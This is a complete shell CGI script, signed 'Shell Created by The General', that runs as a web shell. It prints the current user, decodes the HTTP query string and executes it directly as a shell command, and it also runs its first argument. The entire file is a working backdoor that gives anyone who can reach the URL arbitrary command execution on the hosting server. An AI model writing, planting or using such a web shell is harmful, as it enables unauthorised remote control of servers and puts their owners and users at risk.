#!/bin/sh
echo Content-type: text/plain
echo 
echo Shell Created by The General
echo 
user=`whoami`
echo "Running as user:$user"
#echo whoami
cmd=$QUERY_STRING
cmd2=`echo $cmd | sed 's!%20!\ !g'`
#uncomment if you want to see what is being run
#echo (`echo $QUERY_STRING | sed 's!%20!\ !g'`) 
$cmd2
$1
